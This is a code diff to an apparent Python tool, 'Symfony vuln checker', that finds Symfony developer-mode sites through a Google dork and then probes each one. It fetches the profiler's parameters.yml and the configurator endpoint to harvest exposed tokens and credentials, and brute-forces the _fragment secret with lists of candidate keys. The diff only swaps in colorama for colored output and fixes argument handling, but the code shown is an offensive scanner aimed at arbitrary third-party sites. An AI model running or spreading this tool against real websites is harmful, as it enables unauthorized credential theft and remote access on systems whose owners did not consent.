@@ -12,13 +12,15 @@ try:
 	import sys
 	import os
 	import pyfiglet
+	import colorama
+	from colorama import Fore, Style
 except ImportError as e:
     print("The error occured: %s"%e)
     print("Try this: pip3 install -r ./requirement.txt")
     sys.exit(1)
 
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
-
+colorama.init()
 
 parser=argparse.ArgumentParser(description="This tool allows you to scan the configuration of Symfony's developer mode using Google Dorks")
 parser._action_groups.pop()
@@ -30,17 +32,6 @@ optional.add_argument("--starturl", dest='starturl', help="Specifies which url t
 optional.add_argument("--skip", dest='skip', help="Do not use the token bruteforce method : --skip true", type=bool, default=False)
 args=parser.parse_args()
 
-
-class Color(object):
-	red = '\033[91m'
-	green = '\033[92m'
-	blue = '\033[94m'
-	orange = '\033[93m'
-	magenta = '\033[95m'
-	yellow='\033[93m'
-	ResetAll = '\033[0m'
-
-color = Color()
 
 headers_Get = {
         'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
@@ -247,11 +238,11 @@ HEADER=pyfiglet.figlet_format("Symfony vuln checker", font = "slant"  )
 VERSION='version:1'
 WRITER='https://github.com/bizibabe/symfony-check-vuln-google-dorks\n'
 BY='By Google Dorks\n'
-print(color.yellow+HEADER)
-print(color.magenta+VERSION.center(70))
-print(color.magenta+WRITER.center(70))
-print(color.magenta+BY.center(70))
-print(color.ResetAll)
+print(Fore.YELLOW+HEADER)
+print(Fore.MAGENTA+VERSION.center(70))
+print(Fore.MAGENTA+WRITER.center(70))
+print(Fore.MAGENTA+BY.center(70))
+print(Style.RESET_ALL)
 
 totalUrl = 0
 nbUrl = '10'
@@ -262,12 +253,16 @@ dork_payload = 'intitle:"index of" "app_dev.php"'
 
 if(args.nburl):
 	if(not check_args(args.nburl)):
-		print(color.orange+'[!] Parameter nburl must be int')
+		print(Fore.YELLOW+'[!] Parameter nburl must be int')
 		sys.exit(1)
+	else:
+		nbUrl = args.nburl
 if(args.starturl):
 	if(not check_args(args.starturl)):
-		print(color.orange+'[!] Parameter starturl must be int')
+		print(Fore.YELLOW+'[!] Parameter starturl must be int')
 		sys.exit(1)
+	else:
+		startUrl = args.starturl
 
 try:
 	print('--------------------------------------------------------------------------------------------------------')
@@ -291,19 +286,19 @@ try:
 				if(check1.status_code != 403):
 					if(check2.url == url+'app_dev.php/_profiler/open?file=app/config/parameters.yml' and check2.status_code == 200 and not re.search(".*Token not found.*", str(check2.content))):
 						if(check4.status_code == 403):
-							print(color.green+'[+] {}app_dev.php/_profiler/open?file=app/config/parameters.yml is vulnerable [Token and creds found] [_fragment found]'.format(url))
+							print(Fore.GREEN+'[+] {}app_dev.php/_profiler/open?file=app/config/parameters.yml is vulnerable [Token and creds found] [_fragment found]'.format(url))
 							countVuln = countVuln + 1
 							totalUrl = totalUrl + 1
 						else:
-							print(color.orange+'[!] {}app_dev.php/_profiler/open?file=app/config/parameters.yml maybe vulnerable'.format(url)+color.green+' [Token and creds found]'+color.red+' [_fragment not found]')
+							print(Fore.YELLOW+'[!] {}app_dev.php/_profiler/open?file=app/config/parameters.yml maybe vulnerable'.format(url)+Fore.GREEN+' [Token and creds found]'+Fore.RED+' [_fragment not found]')
 							totalUrl = totalUrl + 1
 					elif(check3.url == url+'app_dev.php/_configurator/final' and check3.status_code == 200 and not re.search(".*Token not found.*", str(check3.content))):
 						if(check4.status_code == 403):
-							print(color.green+'[+] {}app_dev.php/_configurator/final is vulnerable [Token and creds found] [_fragment found]'.format(url))
+							print(Fore.GREEN+'[+] {}app_dev.php/_configurator/final is vulnerable [Token and creds found] [_fragment found]'.format(url))
 							countVuln = countVuln + 1
 							totalUrl = totalUrl + 1
 						else:
-							print(color.orange+'[!] {}app_dev.php/_configurator/final maybe vulnerable'.format(url)+color.green+' [Token and creds found]'+color.red+' [_fragment not found]')
+							print(Fore.YELLOW+'[!] {}app_dev.php/_configurator/final maybe vulnerable'.format(url)+Fore.GREEN+' [Token and creds found]'+Fore.RED+' [_fragment not found]')
 							totalUrl = totalUrl + 1
 					elif(check4.status_code == 403):
 						if(args.skip != True):
@@ -312,45 +307,45 @@ try:
 							totalMutation = len(mutations)
 							for algo, secret, internal_url in mutations:
 								nbMut = nbMut + 1
-								print(color.blue+'[?] {} Trying Token {}/{} ...\r'.format(internal_url,nbMut,totalMutation),end="")
+								print(Fore.BLUE+'[?] {} Trying Token {}/{} ...\r'.format(internal_url,nbMut,totalMutation),end="")
 								urlToken = build_url_with_hash(urlFragment, internal_url, secret, algo)
 								response = requests.get(urlToken)
 								code = response.status_code
 								if code != 403:
-									print(color.green+'[+] {} is vulnerable [Token found : {}]'.format(internal_url,secret)+color.green+' [_fragment found]')
+									print(Fore.GREEN+'[+] {} is vulnerable [Token found : {}]'.format(internal_url,secret)+Fore.GREEN+' [_fragment found]')
 									countVuln = countVuln + 1
 									totalUrl = totalUrl + 1
 									break
 								else:
 									pass
 							else:
-								print(color.orange+'[!] {} maybe vulnerable [Token or internal url not found]'.format(internal_url)+color.green+' [_fragment found]')
+								print(Fore.YELLOW+'[!] {} maybe vulnerable [Token or internal url not found]'.format(internal_url)+Fore.GREEN+' [_fragment found]')
 								nbMut = 0
 								totalUrl = totalUrl + 1
 
 						else:
-							print(color.orange+'[!] {} maybe vulnerable [bruteforce skiped]'.format(url))
+							print(Fore.YELLOW+'[!] {} maybe vulnerable [bruteforce skiped]'.format(url))
 							totalUrl = totalUrl + 1
 					else:
-						print(color.red+'[-] {} is not vulnerable [Something is broken or no method found]'.format(url))
+						print(Fore.RED+'[-] {} is not vulnerable [Something is broken or no method found]'.format(url))
 						totalUrl = totalUrl + 1
 				else:
-					print(color.red+'[-] {} is not vulnerable [app_dev.php is not authorised or non-existent]'.format(url))
+					print(Fore.RED+'[-] {} is not vulnerable [app_dev.php is not authorised or non-existent]'.format(url))
 					totalUrl = totalUrl + 1
-				print(color.ResetAll+'--------------------------------------------------------------------------------------------------------')
+				print(Style.RESET_ALL+'--------------------------------------------------------------------------------------------------------')
 			except requests.ConnectionError:
-				print(color.red+'[-] {} is not vulnerable [Connection refused by the server]'.format(url))
-				print(color.ResetAll+'--------------------------------------------------------------------------------------------------------')
+				print(Fore.RED+'[-] {} is not vulnerable [Connection refused by the server]'.format(url))
+				print(Style.RESET_ALL+'--------------------------------------------------------------------------------------------------------')
 				totalUrl = totalUrl + 1
 				continue
 			except KeyboardInterrupt:
 				break
 			except requests.exceptions.RequestException:
-				print(color.orange+'[!] {} maybe vulnerable [The server did not send any data in the allotted amount of time]'.format(url))
-				print(color.ResetAll+'--------------------------------------------------------------------------------------------------------')
+				print(Fore.YELLOW+'[!] {} maybe vulnerable [The server did not send any data in the allotted amount of time]'.format(url))
+				print(Style.RESET_ALL+'--------------------------------------------------------------------------------------------------------')
 				totalUrl = totalUrl + 1
 				continue
 except KeyboardInterrupt:
 	sys.exit(0)
 	
-print(color.blue+"\n[!] {}/{} websites are vulnerable".format(countVuln,totalUrl))
+print(Fore.BLUE+"\n[!] {}/{} websites are vulnerable".format(countVuln,totalUrl))
